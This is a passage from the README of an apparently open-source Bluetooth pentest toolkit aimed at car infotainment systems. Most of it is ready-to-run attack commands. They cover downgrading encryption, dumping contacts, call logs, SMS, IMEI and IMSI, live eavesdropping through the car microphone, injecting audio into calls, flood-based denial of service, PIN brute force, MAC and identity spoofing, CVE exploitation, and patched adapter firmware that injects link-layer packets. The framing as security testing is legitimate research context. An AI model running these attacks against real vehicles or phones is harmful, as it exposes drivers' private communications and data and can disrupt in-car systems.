blue-tap encryption-downgrade <MAC> -m force-renegotiation       # Stop/start to weaken params
blue-tap encryption-downgrade <MAC> -m reject-secure-connections # Force Legacy SC (weaker keys)
blue-tap encryption-downgrade <MAC> -m all                       # Run all methods
```

**Methods:**

| Method | LMP PDU | Effect |
|--------|---------|--------|
| no-encryption | `LMP_ENCRYPTION_MODE_REQ(mode=0)` | Requests disabling encryption |
| force-renegotiation | Alternating `LMP_STOP_ENCRYPTION`/`LMP_START_ENCRYPTION` | Forces weaker re-negotiation |
| reject-secure-connections | Reject SC PDUs during re-keying | Forces Legacy Secure Connections |

Requires an active ACL connection to the target. Each method result shows VULNERABLE/Partially Accepted/Rejected status.

---

### 7. Data Extraction (PBAP / MAP / AT / OPP)

#### PBAP — Phone Book Access Profile

Download phonebook contacts and call history from the IVI's synced phone data.

```
blue-tap pbap pull <MAC>                     # Pull main phonebook
blue-tap pbap pull <MAC> -p telecom/ich.vcf  # Incoming call history
blue-tap pbap pull <MAC> -p telecom/och.vcf  # Outgoing call history
blue-tap pbap pull <MAC> -p telecom/mch.vcf  # Missed call history
blue-tap pbap pull <MAC> -p telecom/cch.vcf  # Combined call history
blue-tap pbap dump <MAC>                     # Dump ALL: contacts + all call logs + favorites + SIM
blue-tap pbap dump <MAC> -o ./pbap_data/     # Custom output directory
```

**What's extracted:**
- vCard 2.1/3.0 contacts (name, phone numbers, email, address, organization)
- Call history with timestamps, durations, and phone numbers
- SIM phonebook entries (if synced)
- Speed dial / favorites

#### MAP — Message Access Profile

Download SMS and MMS messages stored on the IVI.

```
blue-tap map list <MAC>                    # List messages in inbox
blue-tap map list <MAC> --folder sent      # List sent messages
blue-tap map dump <MAC>                    # Dump all messages from all folders
blue-tap map dump <MAC> -o ./messages/     # Custom output directory
```

**Message folders:** inbox, sent, draft, deleted, outbox

#### AT Command Extraction

Direct data extraction via AT commands over RFCOMM (bluesnarfer-style).

```
blue-tap at connect <MAC>                  # Interactive AT command session
blue-tap at dump <MAC>                     # Dump all: phonebook, SMS, device info
blue-tap at snarf <MAC>                    # External bluesnarfer binary
```

**Data available via AT:**
- `AT+CPBR` — Phonebook entries
- `AT+CMGL` — SMS messages
- `AT+CGSN` — IMEI
- `AT+CIMI` — IMSI
- `AT+CBC` — Battery status
- `AT+CSQ` — Signal strength

#### OPP — Object Push Profile

Push files to the IVI via OBEX Object Push.

```
blue-tap opp push <MAC> <file>               # Push any file to device
blue-tap opp vcard <MAC> -n "Test" -p "+1234" # Push a crafted vCard
```

---

### 8. Audio Interception (HFP / A2DP)

#### HFP — Hands-Free Profile

Call audio capture and injection over SCO (Synchronous Connection-Oriented) links. Includes connection retry with backoff, automatic codec negotiation (CVSD 8kHz / mSBC 16kHz wideband), and tolerant AT response parsing. All operations logged to session.

```
blue-tap hfp connect <MAC>                # Establish Service Level Connection (SLC)
blue-tap hfp capture <MAC> -o call.wav    # Capture call audio to WAV
blue-tap hfp inject <MAC> -f audio.wav    # Inject audio into active call
blue-tap hfp at <MAC> -c "AT+COPS?"      # Send raw AT command
blue-tap hfp dtmf <MAC> -t "1234#"       # Send DTMF tones
blue-tap hfp hold <MAC> -a 2             # Call hold/swap
blue-tap hfp redial <MAC>                 # Redial last number
blue-tap hfp voice <MAC> --activate       # Trigger voice assistant
```

**Key capabilities:**
- RFCOMM and SCO connections retry once with 2s backoff on transient failure
- SLC handshake parsing is resilient to malformed AG responses (graceful degradation instead of crash)
- Codec negotiation detects CVSD vs mSBC — audio capture automatically uses the correct sample rate
- Silent call with proper timing (1.5s delay between dial and mute to avoid race condition)
- Empty audio capture detected early — returns failure instead of writing empty WAV file

#### A2DP — Advanced Audio Distribution

Media stream capture, microphone eavesdropping, and audio injection via PulseAudio/PipeWire. Profile switching retries on failure. Sample rate auto-detected from PulseAudio source info (not hardcoded). Loopback modules tracked for reliable cleanup.

```
blue-tap audio devices                     # List Bluetooth audio sources/sinks
blue-tap audio profile <MAC> hfp           # Switch to HFP profile (mic access)
blue-tap audio profile <MAC> a2dp          # Switch to A2DP profile (media)
blue-tap audio record-mic <MAC>            # Record from car's Bluetooth microphone
blue-tap audio live <MAC>                  # Live eavesdrop: car mic → laptop speakers
blue-tap audio capture <MAC>               # Capture A2DP media stream to WAV
blue-tap audio play <MAC> file.mp3         # Play file through car speakers
blue-tap audio loopback <MAC>              # Route laptop mic → car speakers
blue-tap audio loopback-stop               # Stop loopback (cleans up PA module)
blue-tap audio diagnose <MAC>              # Diagnose Bluetooth audio issues
blue-tap audio list                        # List captured audio files
blue-tap audio playback <file>             # Play captured file locally
blue-tap audio review                      # Interactive audio file review
```

---

### 9. AVRCP Media Control

Audio/Video Remote Control Profile attacks via D-Bus (BlueZ MediaPlayer1 interface). Includes connection retry with 2s backoff, proper D-Bus resource cleanup, and all operations logged to session for reporting.

```
blue-tap avrcp play <MAC>                  # Send play command
blue-tap avrcp pause <MAC>                 # Send pause
blue-tap avrcp stop <MAC>                  # Send stop
blue-tap avrcp next <MAC>                  # Skip to next track
blue-tap avrcp prev <MAC>                  # Skip to previous track
blue-tap avrcp volume <MAC> -l 127         # Set volume to max
blue-tap avrcp volume-ramp <MAC> --start 0 --end 127 --step 5
                                           # Gradual volume escalation (works both up AND down)
blue-tap avrcp skip-flood <MAC> -n 100     # Rapid track skip injection (min 10ms interval)
blue-tap avrcp metadata <MAC>              # Show current track metadata + active player app
blue-tap avrcp monitor <MAC>               # Monitor track changes in real-time
```

**Capabilities:** Playback control, absolute volume set (0-127), bidirectional volume ramp, fast-forward/rewind, repeat/shuffle mode, metadata surveillance (title, artist, album, active app name), track change monitoring via D-Bus signal subscription, skip flood DoS.

---

### 10. Protocol Fuzzing

Response-guided, state-aware fuzzing engine designed for discovering 0-day vulnerabilities in automotive IVI Bluetooth stacks. Works purely over-the-air with standard hardware — no firmware access, no special dongles, no target instrumentation required.

The engine combines techniques from published research (AFLNet, BrakTooth, SNIPUZZ, Defensics) with novel approaches (entropy-based leak detection, timing-based coverage proxy, structural self-consistency validation) to detect bugs that traditional blind fuzzers miss.

#### Architecture

```
                        ┌─────────────────────────────────┐
                        │        Campaign Engine           │
                        │   (protocol rotation, transport) │
                        └────────┬──────────┬──────────────┘
                                 │          │
              ┌──────────────────┤          ├──────────────────────┐
              ▼                  ▼          ▼                      ▼
    ┌─────────────────┐  ┌────────────┐  ┌──────────────┐  ┌──────────────┐
    │  State Inference │  │  Mutation  │  │   Response   │  │    Health    │
    │   (AFLNet IPSM)  │  │  Weights   │  │   Analyzer   │  │   Monitor   │
    │  state_inference │  │  field_wt  │  │  response_   │  │  health_    │
    │       .py        │  │  tracker.py│  │  analyzer.py │  │  monitor.py │
    └─────────────────┘  └────────────┘  └──────────────┘  └──────────────┘
      Protocol state       Adaptive        3-layer anomaly    Watchdog reboot
      graph + scoring      field-level     detection: struct  detection, zombie
      + seed selection     mutation        + timing + entropy  state, degradation
```

#### Campaign Mode

```bash
blue-tap fuzz campaign <MAC>                              # Fuzz all protocols
blue-tap fuzz campaign <MAC> -p sdp -p rfcomm             # Specific protocols
blue-tap fuzz campaign <MAC> --strategy targeted           # CVE-targeted mutations
blue-tap fuzz campaign <MAC> --strategy state-machine      # Protocol state violations
blue-tap fuzz campaign <MAC> --strategy coverage           # Response-guided coverage
blue-tap fuzz campaign <MAC> --duration 2h --capture       # 2 hours + pcap capture
blue-tap fuzz campaign <MAC> -n 50000 --delay 0.1          # 50K iterations, fast
blue-tap fuzz campaign --resume                            # Resume previous campaign
```

#### Supported Protocols (12)

| Protocol | Transport | Attack Surface |
|----------|-----------|----------------|
| `sdp` | L2CAP PSM 1 | Service records, continuation state, data elements, PDU parsing |
| `rfcomm` | L2CAP PSM 3 | Frame types, PN/MSC/RPN negotiation, credit flow, FCS |
| `l2cap` | L2CAP PSM 1 | Signaling commands, config options, CID manipulation, echo |
| `obex-pbap` | RFCOMM ch 15 | PBAP headers, app parameters, session lifecycle |
| `obex-map` | RFCOMM ch 16 | MAP headers, message listing, folder traversal |
| `obex-opp` | RFCOMM ch 9 | Object Push headers, large payloads |
| `at-hfp` | RFCOMM ch 10 | HFP SLC handshake, codec negotiation, AT injection |
| `at-phonebook` | RFCOMM ch 1 | AT+CPBR phonebook access |
| `at-sms` | RFCOMM ch 1 | AT+CMGL/CMGR SMS commands |
| `ble-att` | BLE CID 4 | ATT handles, writes, MTU, prepare writes, signed writes |
| `ble-smp` | BLE CID 6 | Pairing, key sizes, ECDH curve points, sequencing |
| `bnep` | L2CAP PSM 15 | Setup connection, ethernet frames, filter lists |
| `lmp` | HCI VSC 0xFE22 | LMP opcodes, key negotiation, feature response, role switch, encryption setup |

#### Fuzzing Strategies

| Strategy | Approach | Best For |
|----------|----------|----------|
| `random` | 70% template + 30% corpus byte-level mutation with adaptive field weighting | General exploration, first-pass fuzzing |
| `coverage` | Response-diversity tracking with energy scheduling — inputs producing novel responses get more mutations | Deep exploration, maximizing code path coverage |
| `state-machine` | Protocol state violation attacks — skip steps, go backwards, repeat states | OBEX, HFP, SMP, ATT state machine bugs |
| `targeted` | CVE reproduction + variation — exact reproduction patterns then field mutations | Testing for known vulnerability classes |

### Fuzzing Intelligence

Blue-Tap implements six layers of intelligence that run automatically during every campaign:

**1. Response-Based State Inference** (adapted from [AFLNet](https://mboehme.github.io/paper/ICST20.AFLNet.pdf))

Extracts protocol state IDs from every response (SDP PDU type + error code, ATT opcode + error, L2CAP command + result, RFCOMM frame type, SMP code, OBEX response code, BNEP type, AT result). Builds a directed state graph incrementally. Uses AFLNet's scoring formula to prioritize under-explored states:

```
score = 1000 * 2^(-log10(log10(fuzz_count+1) * selected_times + 1)) * 2^(log(paths_discovered+1))
```

States that produce new transitions get more fuzzing iterations. States that have been heavily explored get fewer.

**2. Anomaly-Guided Field Mutation Weights** (inspired by [BrakTooth](https://asset-group.github.io/papers/BrakTooth.pdf))

Instead of mutating random bytes, the engine knows which fields exist in each protocol packet (SDP `param_length`, ATT `handle`, L2CAP `CID`, RFCOMM `length`, etc.). It tracks which fields produce anomalies and crashes, then increases their mutation probability:

```
weight = 1.0 + (anomaly_ratio * 5.0) + (crash_ratio * 20.0)
```

Fields that cause crashes get 20x the base mutation weight. The fuzzer converges on the fields that matter for each specific target.

**3. Structural Response Validation** (novel — no prior BT fuzzer does this)

Validates every response against protocol-level self-consistency rules that ALL Bluetooth stacks must follow:

- SDP: `ParameterLength` must match actual payload bytes
- ATT: Error codes must be in valid range (0x01-0x14 or 0x80-0xFF)
- L2CAP: Signaling `Length` field must match payload
- RFCOMM: FCS checksum must be correct (CRC-8 computation)
- SMP: Pairing Request/Response must be exactly 7 bytes
- OBEX: Packet length header must match actual size
- AT: Responses must be valid ASCII terminated with `\r\n`

Any violation = the target's parser is confused = potential vulnerability.

**4. Timing-Based Coverage Proxy** (novel — identified as open research gap)

Before fuzzing starts, the engine learns each target's normal response latency per protocol and per opcode. During fuzzing, it detects:

- **Latency spikes**: Response > p99 baseline = different code path reached
- **Latency drops**: Response significantly faster = parser rejected input early
- **Timing clusters**: Groups of similar latencies; new cluster = new code path
- **Consecutive spikes**: 3+ in a row = target may be degrading

**5. Entropy-Based Leak Detection** (novel application to Bluetooth)

Detects information leaks (heap/stack disclosure) without firmware access using:

- **Shannon entropy**: Structured protocol data has entropy 2-5 bits/byte. Leaked heap data has entropy >6.5 bits/byte
- **Renyi entropy**: More sensitive to dominant byte values for partial leaks
- **Sliding window analysis**: Detects localized high-entropy regions in otherwise normal responses
- **Heap pattern scanning**: Detects 0xDEADBEEF, 0xBAADF00D, repeated 4-byte patterns, pointer-like values
- **Response echo detection**: Request bytes appearing in unexpected response positions = buffer reuse

**6. Watchdog Reboot Detection** (adapted from [Defensics](https://www.blackduck.com/blog/break-car-kits-with-bluetooth-fuzz-testing.html))

IVI Bluetooth stacks have watchdog timers that restart the daemon after a crash. This reboot is invisible at the protocol level. The health monitor detects it by:

- Tracking consecutive failures (3+ = trigger health check)
- Probing target with l2ping at exponential backoff (1s, 2s, 4s)
- Detecting the reboot signature: target returns after silence with fresh state
- Tracking reboot count as the highest-confidence crash signal
- Saving the last 10 fuzz payloads before each reboot as crash candidates with confidence scores
- Detecting zombie states: l2ping succeeds but protocol requests fail = upper stack crashed
- Detecting degradation: gradually increasing latency = memory leak on target

#### Live Dashboard

The campaign runs with a real-time Rich terminal dashboard showing:

| Metric | Description |
|--------|-------------|
| Runtime / progress | Elapsed time with progress bar (% of duration or iterations) |
| Test cases / rate | Total iterations and cases per second |
| Crashes found | Count with severity breakdown (CRITICAL, HIGH, MEDIUM, LOW) |
| Protocol breakdown | Per-protocol: test cases sent and crashes detected |
| Last crash | Timestamp, protocol, type, payload hex preview, mutation log |
| **Target health** | ALIVE / DEGRADED / UNREACHABLE / REBOOTED / ZOMBIE (color-coded) |
| **States discovered** | Per-protocol state and transition counts |
| **Timing clusters** | Number of distinct response latency groups per protocol |
| **Anomaly count** | Breakdown by type: structural, timing, leak, behavioral |
| **Hot fields** | Top mutation fields ranked by anomaly/crash weight |

**Keyboard controls:** `SPACE` pause/resume, `S` snapshot, `Q` quit.

#### Crash Management

```bash
blue-tap fuzz crashes list                             # List all crashes
blue-tap fuzz crashes list --severity CRITICAL          # Filter by severity
blue-tap fuzz crashes list --protocol sdp               # Filter by protocol
blue-tap fuzz crashes show 1                           # Full crash details + hexdump
blue-tap fuzz crashes replay 1                         # Replay to verify reproduction
blue-tap fuzz crashes replay 1 --capture               # Replay with pcap capture
blue-tap fuzz crashes export -o crashes.json           # Export for reporting
```

The crash detail view shows: severity, protocol, crash type, full payload hexdump, mutation log (which field was mutated and how), device response hexdump, reproduction status, and analyst notes.

#### Crash Minimization

Reduce crash payloads to the minimum bytes needed to trigger the bug:

```bash
blue-tap fuzz minimize 1                               # Auto-select strategy
blue-tap fuzz minimize 3 --strategy ddmin              # Delta debugging (thorough)
blue-tap fuzz minimize 5 --strategy binary              # Binary search (fast)
blue-tap fuzz minimize 2 --strategy field               # Field-level analysis
```

Three complementary strategies:
- **Binary search**: Halve payload, test, refine — fast, ~8 iterations
- **Delta debugging (ddmin)**: Incrementally remove chunks — thorough, ~50-200 tests
- **Field reducer**: Zero each byte individually, mark essential vs nullable — identifies exact crash-triggering fields

#### Protocol-Specific Fuzzers

Deep protocol fuzzers with targeted mode selection:

```bash
blue-tap fuzz sdp-deep <MAC> --mode continuation       # SDP continuation state (CVE-2017-0785)
blue-tap fuzz sdp-deep <MAC> --mode data-elements      # SDP data element malformation
blue-tap fuzz l2cap-sig <MAC> --mode config            # L2CAP config option parsing
blue-tap fuzz l2cap-sig <MAC> --mode echo              # L2CAP echo flood
blue-tap fuzz rfcomm-raw <MAC> --mode credits          # Credit-based flow control abuse
blue-tap fuzz obex <MAC> -p pbap --mode headers        # OBEX header parsing
blue-tap fuzz obex <MAC> -p map --mode path-traversal  # OBEX path traversal
blue-tap fuzz ble-att <MAC> --mode writes              # BLE ATT write overflow
blue-tap fuzz ble-att <MAC> --mode mtu                 # MTU negotiation boundary
blue-tap fuzz ble-smp <MAC> --mode curve               # Invalid ECDH curve (CVE-2018-5383)
blue-tap fuzz bnep <MAC> --mode setup                  # BNEP setup (CVE-2017-0781)
blue-tap fuzz at-deep <MAC> --category injection       # AT command injection
```

#### CVE Reproduction

Test targets against known Bluetooth vulnerability patterns:

```bash
blue-tap fuzz cve --list                              # List all supported CVE patterns
blue-tap fuzz cve <MAC>                                # Run all CVE patterns
blue-tap fuzz cve <MAC> --cve-id 2017-0785             # Android SDP info leak
blue-tap fuzz cve <MAC> --cve-id 2017-0781             # BNEP heap overflow
blue-tap fuzz cve <MAC> --cve-id 2018-5383             # Invalid ECDH curve
blue-tap fuzz cve <MAC> --cve-id 2024-24746            # NimBLE prepare write loop
```

Supported CVEs: CVE-2017-0785 (BlueBorne SDP), CVE-2017-0781 (BNEP overflow), SweynTooth family, CVE-2018-5383 (Invalid Curve), CVE-2024-24746 (NimBLE), CVE-2024-45431 (PerfektBlue L2CAP).

#### Corpus Management

```bash
blue-tap fuzz corpus generate                          # Generate seeds from protocol builders
blue-tap fuzz corpus generate -p sdp                   # Generate for specific protocol
blue-tap fuzz corpus list                              # Show stats per protocol
blue-tap fuzz corpus minimize                          # Deduplicate by content hash
```

Protocol builders generate 2,900+ seed cases across all protocols (SDP: 858, SMP: 650, BNEP: 580, ATT: 411, RFCOMM: 239, L2CAP: 166).

#### PCAP Replay

Import and replay captured Bluetooth traffic:

```bash
blue-tap fuzz replay capture.btsnoop -t <MAC> --list    # Inspect frames
blue-tap fuzz replay capture.btsnoop -t <MAC>            # Replay all frames
blue-tap fuzz replay capture.btsnoop -t <MAC> -p sdp     # Filter by protocol
blue-tap fuzz replay capture.btsnoop -t <MAC> --mutate   # Replay with mutations
```

Supports btsnoop v1 format with HCI ACL fragmentation reassembly.

#### Report Integration

Campaign results feed directly into the pentest report (`blue-tap report`):

- **Executive summary**: Crash counts, severity breakdown, SVG donut/bar charts
- **Crash details**: Full hexdump, mutation log, reproduction steps per crash
- **Fuzzing intelligence**: State coverage graph, field weight analysis with bar charts, target response baselines, health event timeline
- **Evidence package**: Exportable crash payloads (.bin), pcap captures, crash descriptions

---

### 11. Denial of Service

15 protocol-level DoS attacks targeting different layers of the Bluetooth stack.

#### Pairing-Level

```bash
blue-tap dos pair-flood <MAC>                          # Flood with pairing requests
blue-tap dos name-flood <MAC>                          # Pair with max-length names (memory exhaustion)
blue-tap dos rate-test <MAC>                           # Detect rate limiting on pairing
blue-tap dos pin-brute <MAC>                           # Brute-force legacy PIN pairing
blue-tap dos l2ping-flood <MAC>                        # L2CAP echo request flood (requires root)
```

#### L2CAP Transport

```bash
blue-tap dos l2cap-storm <MAC>                         # Connection storm (rapid connect/disconnect cycling)
blue-tap dos l2cap-cid-exhaust <MAC>                   # CID exhaustion (open and hold parallel connections)
blue-tap dos l2cap-data-flood <MAC>                    # Data flood (large malformed SDP requests at max rate)
```

#### Protocol-Specific

```bash
blue-tap dos sdp-continuation <MAC>                    # SDP continuation state exhaustion (CVE-2017-0785 related)
blue-tap dos sdp-des-bomb <MAC>                        # SDP nested DES bomb (recursive parsing overload)
blue-tap dos rfcomm-sabm-flood <MAC>                   # RFCOMM SABM flood (exhaust all 60 DLCIs)
blue-tap dos rfcomm-mux-flood <MAC>                    # RFCOMM multiplexer command flood (Test echo on DLCI 0)
blue-tap dos obex-connect-flood <MAC>                  # OBEX session exhaustion (open all OBEX services)
blue-tap dos hfp-at-flood <MAC>                        # HFP AT command flood (overwhelm AT parser)
blue-tap dos hfp-slc-confuse <MAC>                     # HFP SLC state machine confusion (out-of-order commands)
```

---

### 12. MAC Spoofing and Adapter Management

#### MAC Address Spoofing

Three spoofing methods with automatic fallback (bdaddr → spooftooph → btmgmt). Hardware rejection detection with 8+ patterns per method. Persistent MAC save/restore with atomic JSON writes and corruption recovery. All operations logged to session.

```
blue-tap spoof mac <TARGET_MAC>                        # Change adapter MAC address (auto-selects method)
blue-tap spoof mac <TARGET_MAC> -m bdaddr              # Force specific method
blue-tap spoof clone <MAC> -n "iPhone 15"              # Full identity clone: MAC + name + device class
blue-tap spoof restore                                 # Restore original MAC from saved state
```

**Adapter safety:** Power commands are return-code checked — adapter won't be left in DOWN state. Sleep timing between reset/down/up prevents race conditions. Original MAC backed up atomically before first spoof; corruption recovery preserves the backup.

#### Adapter Management

```
blue-tap adapter list                                  # List all Bluetooth adapters with chipset info
blue-tap adapter info <hci>                            # Detailed adapter info (features, capabilities)
blue-tap adapter up <hci>                              # Bring adapter up
blue-tap adapter down <hci>                            # Bring adapter down
blue-tap adapter reset <hci>                           # Reset adapter
blue-tap adapter set-name <hci> <name>                 # Set adapter friendly name
blue-tap adapter set-class <hci> <class>               # Set device class (e.g., 0x5a020c for phone)
```

---

### 13. Session Management and Reporting

#### Sessions

Every command automatically logs structured output to the active session.

```
blue-tap -s my_assessment scan classic     # Named session
blue-tap -s my_assessment vulnscan <MAC>   # Same session
blue-tap -s my_assessment pbap dump <MAC>  # Same session
blue-tap session list                       # List all sessions
blue-tap session show my_assessment         # Session details
```

**Session directory structure:**
```
sessions/my_assessment/
  session.json              # Metadata + command log
  001_scan_classic.json     # Scan results
  002_vulnscan.json         # Vulnerability findings
  003_pbap_dump.json        # PBAP extraction log
  pbap/                     # vCard files
  map/                      # bMessage files
  audio/                    # WAV captures
  report.html               # Generated report
```

#### Report Generation

```
blue-tap report                             # Report from current session
blue-tap -s my_assessment report             # Report from named session
blue-tap report ./hijack_output              # Report from specific directory
blue-tap report -f json -o report.json       # JSON format
blue-tap report -f html -o report.html       # HTML format (default)
```

**HTML report includes:**
- Executive summary with severity breakdown
- Vulnerability findings table with CVE references, impact, and remediation
- Extracted data summary (contact count, message count, call history)
- Fuzzing campaign results with crash cards (hex dumps, reproducibility status)
- Dark-themed, standalone HTML (no external dependencies)

---

### 13b. DarkFirmware and Below-HCI Attacks

DarkFirmware is a custom firmware for RTL8761B-based USB Bluetooth adapters (TP-Link UB500, USB ID 2357:0604) that enables direct LMP packet injection and monitoring. This extends Blue-Tap's reach below the HCI boundary to attack link-layer protocols that standard BlueZ cannot access.

#### Firmware Management

```bash
blue-tap adapter firmware-status                     # Check DarkFirmware status
blue-tap adapter firmware-install                    # Install bundled DarkFirmware
blue-tap adapter firmware-install --restore          # Revert to stock Realtek firmware
blue-tap adapter firmware-spoof <MAC>                # BDADDR spoofing via firmware patch
blue-tap adapter firmware-set <addr> <value>         # Direct firmware memory write
blue-tap adapter firmware-dump --addr 0x200000 --len 256  # Dump controller memory
```

#### Capabilities Enabled by DarkFirmware

| Capability | VSC Opcode | Description |
|-----------|------------|-------------|
| LMP Injection | 0xFE22 | Inject arbitrary LMP packets into live connections |
| LMP Monitoring | Event 0xFF | Capture incoming LMP packets as HCI vendor events |
| Memory Read | 0xFC61 | Read 32-bit-aligned controller memory |
| Memory Write | 0xFC62 | Write 32-bit-aligned controller memory |

#### LMP Sniffing and Monitoring

```bash
blue-tap recon lmp-sniff <MAC>                       # Sniff LMP packets on a connection
blue-tap recon lmp-monitor -i hci1                   # Monitor all LMP traffic (DarkFirmware)
blue-tap recon lmp-monitor -i hci1 --dashboard       # With live dashboard
blue-tap recon combined-sniff <MAC>                  # Combined HCI + LMP monitoring
```

#### Attacks That Require DarkFirmware

| Attack | Command | CVE |
|--------|---------|-----|
| BLUFFS session key downgrade | `blue-tap bluffs` | CVE-2023-24023 |
| Encryption downgrade | `blue-tap encryption-downgrade` | — |
| BIAS LMP injection mode | `blue-tap bias attack --method lmp` | CVE-2020-10135 |
| KNOB LMP key negotiation | `blue-tap knob attack` | CVE-2019-9506 |
| LMP-level DoS | `blue-tap dos lmp` | — |
| LMP protocol fuzzing | `blue-tap fuzz lmp` | — |

#### Required Hardware

**RTL8761B USB adapter** — TP-Link UB500 (USB 2357:0604), ~₹599 / ~$8.

The RTL8761B runs a MIPS16e core with 256KB SRAM. DarkFirmware patches the firmware's LMP handler to redirect incoming packets as HCI vendor events and adds a VSC handler for outbound LMP injection. The original firmware is backed up automatically before patching.

---

### 14. Automation and Orchestration

#### Auto Mode — Full 9-Phase Pentest

Executes a complete Bluetooth penetration test methodology in a single command. Resilient by design — each phase runs independently, failures are logged and skipped, never abort. Skipped phases are tracked in results with explicit reason. Reports are timestamped to avoid overwriting previous runs.

| Phase | Name | What It Does |
|:-----:|------|-------------|
| 1 | Discovery | Scan for nearby devices, identify the phone paired with the IVI |
| 2 | Fingerprinting | BT version, chipset, manufacturer, profiles, attack surface |
| 3 | Reconnaissance | SDP services, RFCOMM channels 1-30, L2CAP PSMs |
| 4 | Vuln Assessment | 20+ CVE and configuration checks (parallel local analysis + sequential active probes) |
| 5 | Pairing Attacks | SSP downgrade probe, KNOB (CVE-2019-9506) probe |
| 6 | Exploitation | Hijack: MAC spoof + identity clone + PBAP/MAP extraction (skipped if no phone found) |
| 7 | Protocol Fuzzing | Coverage-guided fuzzing across sdp, rfcomm, l2cap, ble-att (default: 1 hour) |
| 8 | DoS Testing | L2CAP storm, CID exhaustion, SDP continuation, RFCOMM SABM, HFP AT flood |
| 9 | Report | Timestamped HTML + JSON with all findings, evidence, and fuzzing intelligence |

```bash
blue-tap auto <IVI_MAC>                                # Full 9-phase pentest (1hr fuzz)
blue-tap auto <IVI_MAC> --fuzz-duration 7200           # 2 hour fuzzing phase
blue-tap auto <IVI_MAC> --skip-fuzz                    # Skip fuzzing (faster assessment)
blue-tap auto <IVI_MAC> --skip-dos                     # Skip DoS tests
blue-tap auto <IVI_MAC> --skip-fuzz --skip-dos         # Quick: recon + vuln + exploit only
blue-tap auto <IVI_MAC> -d 60                          # 60-second phone discovery window
blue-tap auto <IVI_MAC> -o ./pentest_output/           # Custom output directory
```

**Phase tracking:** Skipped phases appear in results with `"status": "skipped"` and a reason (e.g., "no phone discovered", "user requested"). Summary shows passed/failed/skipped counts. Duration parameters are validated (must be positive). Reports are saved as `report_YYYYMMDD_HHMMSS.html` with a `report.html` latest copy for convenience.

#### Run Mode (Playbook)

Execute multiple commands in sequence with a single invocation.

```
# Inline commands
blue-tap -s assessment run \
  "scan classic" \
  "recon fingerprint TARGET" \
  "recon sdp TARGET" \
  "vulnscan TARGET" \
  "report"

# Playbook file (one command per line)
blue-tap -s assessment run --playbook pentest.txt
```

`TARGET` is a placeholder — you'll be prompted to select a discovered device.

**Example playbook (`pentest.txt`):**
```
scan classic
recon fingerprint TARGET
recon sdp TARGET
recon rfcomm-scan TARGET
recon l2cap-scan TARGET
vulnscan TARGET
pbap dump TARGET
map dump TARGET
report
```

---

## Quick Start

### Prerequisites

| Requirement | Purpose |
|-------------|---------|
| Linux (Kali, Ubuntu 22.04+, Debian) | BlueZ Bluetooth stack |
| Python 3.10+ | Runtime |
| BlueZ 5.x | Bluetooth protocol stack |
| External USB Bluetooth adapter | Required for full feature access (see below) |
| Root access | Required for raw L2CAP/RFCOMM, adapter control, btmon |

### Recommended Hardware

A dedicated USB Bluetooth adapter is **required** for full-feature pentesting. Internal laptop adapters (Intel, Realtek) enforce Secure Simple Pairing and block MAC spoofing, which disables most attack capabilities.

| Adapter | MAC Spoofing | Legacy PIN | BLE | Classic | Fuzzing | DarkFirmware | Price | Verdict |
|---------|:---:|:---:|:---:|:---:|:---:|:---:|:-----:|---------|
| **RTL8761B USB** (TP-Link UB500) | Via firmware | Partial | Yes | Yes | Yes | **Yes** | ~$8 | **Primary adapter** — BT 5.0, DarkFirmware for BLUFFS/LMP injection |
| **nRF52840 dongle** | N/A | N/A | Sniff only | No | No | No | ~$10 | BLE raw PDU sniffing and pairing capture |


**Recommended setup:** RTL8761B as primary adapter — handles both standard HCI attacks and below-HCI attacks (BLUFFS, LMP injection/monitoring, encryption downgrade). Add nRF52840 for BLE sniffing.

### Installation

```bash
# 1. Install system dependencies (Kali / Ubuntu / Debian)
sudo apt update
sudo apt install -y bluez bluez-tools python3-pip python3-dev python3-venv libbluetooth-dev

# 2. Install Blue-Tap
pip install blue-tap

# 3. Verify
blue-tap --version
blue-tap adapter list
```

**Alternative: install from source**

```bash
git clone https://github.com/Indspl0it/blue-tap.git
cd blue-tap
pip install -e .
```

### Optional: Enable BlueZ Compatibility Mode

Required for `sdptool` (SDP browsing) and certain SDP fuzzing operations:

```bash
# Add --compat to bluetoothd ExecStart line
sudo sed -i 's|ExecStart=.*/bluetoothd|& --compat|' /lib/systemd/system/bluetooth.service
sudo systemctl daemon-reload
sudo systemctl restart bluetooth

# Verify
sdptool browse local   # Should not show "Failed to connect to SDP server"
```

### DarkFirmware Setup (Optional — for below-HCI attacks)

If you have an RTL8761B adapter (TP-Link UB500), install DarkFirmware to enable LMP injection, BLUFFS, and encryption downgrade attacks. Blue-Tap auto-detects the adapter and firmware status at startup.

```bash
# Check adapter and firmware status
blue-tap adapter list
blue-tap adapter firmware-status --hci hci1

# Install DarkFirmware (backs up original firmware automatically)
sudo blue-tap adapter firmware-install --hci hci1

# Verify — CLI will show "DarkFirmware active on hci1" on next run
blue-tap adapter firmware-status --hci hci1
```

Without DarkFirmware, Blue-Tap works normally for all HCI-level attacks (hijack, PBAP, MAP, fuzzing, DoS, etc.). DarkFirmware is only required for BLUFFS, encryption downgrade, LMP fuzzing, and LMP monitoring.

### First Scan

```bash
# Check adapter is available (DarkFirmware status shown automatically)
blue-tap adapter list

# Discover nearby Bluetooth devices
sudo blue-tap scan classic

# If you see a target device:
sudo blue-tap recon sdp <MAC>
sudo blue-tap vulnscan <MAC>
```

---

## Usage Guide

### Global Options

```
blue-tap [OPTIONS] COMMAND [ARGS]...

Options:
  --version           Show version and exit
  -v, --verbose       Verbosity: -v verbose, -vv debug
  -s, --session TEXT  Session name (default: auto-generated timestamp)
  --help              Show help and exit
```

### Command Reference

<details>
<summary><strong>blue-tap --help</strong> (click to expand)</summary>

```
  ██████╗ ██╗     ██╗   ██╗███████╗ ████████╗ █████╗ ██████╗
  ██╔══██╗██║     ██║   ██║██╔════╝ ╚══██╔══╝██╔══██╗██╔══██╗
  ██████╔╝██║     ██║   ██║█████╗      ██║   ███████║██████╔╝
  ██╔══██╗██║     ██║   ██║██╔══╝      ██║   ██╔══██║██╔═══╝
  ██████╔╝███████╗╚██████╔╝███████╗    ██║   ██║  ██║██║
  ╚═════╝ ╚══════╝ ╚═════╝ ╚══════╝    ╚═╝   ╚═╝  ╚═╝╚═╝
  ─────── Bluetooth/BLE Automotive IVI Pentest Toolkit ───────

 Usage: blue-tap [OPTIONS] COMMAND [ARGS]...

 Quick start:
   blue-tap adapter list                        # check adapters
   blue-tap scan classic                        # discover devices
   blue-tap vulnscan AA:BB:CC:DD:EE:FF          # vulnerability scan
   blue-tap hijack IVI_MAC PHONE_MAC            # full attack chain

 Sessions (automatic — all output is always saved):
